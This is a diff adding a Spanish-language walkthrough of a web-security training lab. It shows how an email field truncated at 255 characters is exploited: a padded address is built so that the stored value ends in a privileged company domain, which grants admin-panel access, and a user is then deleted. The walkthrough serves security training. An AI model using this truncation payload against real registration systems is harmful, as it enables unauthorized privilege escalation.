@@ -166,3 +166,83 @@ Ahora si le damos clic en **Place Order**.
 
 ## 4. Lab: Inconsistent handling of exceptional input
 
+```bash
+Esta práctica de laboratorio no valida adecuadamente la entrada del usuario. Puede aprovechar una falla lógica en el proceso de registro de su cuenta para obtener acceso a la funcionalidad administrativa. Para resolver el laboratorio, acceda al panel de administración y elimine a Carlos
+```
+
+Intentaremos registrarnos usando un correo muy largo, para ver si ocurre algun caso excepcional con respecto al input.
+
+```bash
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@acd61f861ec39ef080ab06a901cf0050.web-security-academy.net
+```
+
+![](img23.png)
+
+Nos da la siguiente respuesta:
+
+```
+Please check your emails for your account registration link
+```
+
+Entonces activamos la cuenta y vamos a la seccion **My Account**
+
+![](img24.png)
+
+Como podemos ver, cualquier correo que pongamos llegará al **email client** sin inportar que no sea el correo especificado ahí.
+
+Ahora nos logeamos con nuestra cuenta creada luego de darle clic al enlace.
+
+![](img25.png)
+
+Como podemos ver, el correo se trunca ante una logitud. Lo que haremos será obtener la cantidad de caracteres donde se trunca el correo.
+
+```python
+>>> len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@acd61f861ec39ef080ab06a901cf0050.web-security-academy.")
+255
+```
+
+Entonces pensaremos en un payload que al cortarse pueda truncarse y obtener el correo que deseamos.
+
+```bash
+textoo....oooo@dontwannacry.com.acd61f861ec39ef080ab06a901cf0050.web-security-academy.net
+```
+
+Ahora, entramos a un posible directorio llamado **admin** y nos dice que solo pueden ingresar los usuarios **DontWannaCry**.
+
+![](img26.png)
+
+Entonces, calculamos la longiutd del correo **@dontwannacry.com** y lo que resta lo rellenamos de **A**.
+
+```python
+>>> 255-len("@dontwannacry.com")
+238
+>>> print "A"*238
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+Nuestro payload sería pero debemos agregarle la finalidad **.acd61f861ec39ef080ab06a901cf0050.web-security-academy.net**.
+
+```bash
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com.acd61f861ec39ef080ab06a901cf0050.web-security-academy.net
+```
+
+Ahora nos registrmos con el payload como correo.
+
+![](img27.png)
+
+Y luego de activar la cuenta, ingresamos y vamos a la seccion de **My Account**.
+
+![](img28.png)
+
+Y como podemos ver, tenemos disponible el panel del **Admin**.
+
+![](img29.png)
+
+Nuestra mision es matar al usuario **carlos**.
+
+![](img30.png)
+
+Y logramos solucionar el laboratorio.
+
+## 5. Lab: Inconsistent security controls
+
